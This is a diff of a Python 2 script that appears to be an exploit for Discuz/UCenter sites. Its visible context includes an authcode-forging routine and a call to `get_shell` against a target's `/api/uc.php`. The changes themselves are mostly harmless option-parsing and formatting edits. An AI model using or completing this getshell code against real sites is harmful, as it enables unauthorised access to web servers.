@@ -1,4 +1,6 @@
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+# encoding: utf-8
+# encoding: utf-8
 import os
 from pymongo import MongoClient
 import re
@@ -7,7 +9,6 @@ import sys
 import random
 import string
 from PIL import Image
-import pytesseract
 
 from multiprocessing import Queue
 from multiprocessing import Pool
@@ -25,12 +26,21 @@ import urllib
 import urllib2
 import sys
 
+from optparse import OptionParser 
+from optparse import OptionGroup
+from optparse import OptionError
+
+
 def microtime(get_as_float = False) :
 
     if get_as_float:
         return time.time()
     else:
-        return '%.8f %d' % math.modf(time.time()) def get_authcode(string, key = ''): ckey_length = 4
+        return '%.8f %d' % math.modf(time.time()) 
+
+
+def get_authcode(string, key = ''): 
+    ckey_length = 4
     key = hashlib.md5(key).hexdigest()
     keya = hashlib.md5(key[0:16]).hexdigest()
     keyb = hashlib.md5(key[16:32]).hexdigest()
@@ -105,21 +115,28 @@ def execute():
     url=host+"/api/uc.php"
     print get_shell(url,key,host)
 
+
 def test():
 
-    a = open('test.txt', 'r').read().strip()
-    # print a
-    print a.decode('hex')
+    usage = "usage: %prog [options]"  
+    parser = OptionParser(usage)
+    parser.add_option('--data', dest='data', 
+                      help='this is a data help')
 
+    group = OptionGroup(parser, 'Tem option', 'This is for test option')
+    group.add_option('--tmp', dest='tmp',
+                    help='this is a tmp help')
+    parser.add_option_group(group)
+    options, args = parser.parse_args()
+    
 
 def main():
-
     test()
 
 
 if __name__ == '__main__':
-
-    os.system('clear')
+    # os.system('clear')
 
     main()
+
 
